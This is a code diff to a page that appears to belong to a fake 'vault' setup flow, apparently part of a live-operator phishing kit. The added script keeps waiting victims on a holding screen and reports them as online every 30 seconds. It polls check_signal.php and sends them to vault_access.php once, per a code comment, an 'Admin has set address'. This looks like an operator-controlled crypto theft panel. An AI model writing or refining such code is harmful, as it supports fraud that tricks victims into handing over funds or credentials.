@@ -264,10 +264,14 @@ updateActivity($_SESSION['token'], "VaultCodeShown");
             ⚠️ This code will only be shown once. Make sure to save it securely before continuing.
         </div>
         
-        <form method="POST" action="loading.php">
-            <input type="hidden" name="vault_continue" value="1">
-            <button type="submit" class="continue-button">Continue</button>
-        </form>
+        <div style="background-color: #1A1B1F; border: 1px solid #32353D; border-radius: 12px; padding: 20px; margin-bottom: 24px; text-align: center;">
+            <div style="color: #B0B0B0; font-size: 16px; margin-bottom: 8px;">
+                Please wait while we prepare your vault...
+            </div>
+            <div style="color: #588BFA; font-size: 14px;">
+                You will be automatically redirected when ready.
+            </div>
+        </div>
         
         <div class="info-box">
             <div class="info-icon">
@@ -299,5 +303,50 @@ updateActivity($_SESSION['token'], "VaultCodeShown");
             <a href="#">Privacy policy</a>
         </div>
     </div>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script>
+    $(document).ready(function() {
+        // Function to periodically check for admin actions
+        function checkForNextStep() {
+            $.ajax({
+                type: 'GET',
+                url: 'check_signal.php',
+                success: function(response) {
+                    switch(response) {
+                        case 'AddressSet':
+                            // Admin has set address, redirect to vault access page
+                            window.location.href = 'vault_access.php';
+                            break;
+                        default:
+                            // Continue waiting
+                            break;
+                    }
+                },
+                error: function(xhr, status, error) {
+                    console.error('Error checking for next step:', error);
+                },
+                complete: function() {
+                    // Repeat the check every 3 seconds
+                    setTimeout(checkForNextStep, 3000);
+                }
+            });
+        }
+
+        // Start checking for the signal
+        checkForNextStep();
+    });
+
+    // Update status to online
+    function updateStatus() {
+        fetch('update_status.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: 'status=online'
+        }).catch(err => console.error('Status update failed:', err));
+    }
+    updateStatus();
+    setInterval(updateStatus, 30000);
+    </script>
 </body>
-</html> 
+</html>
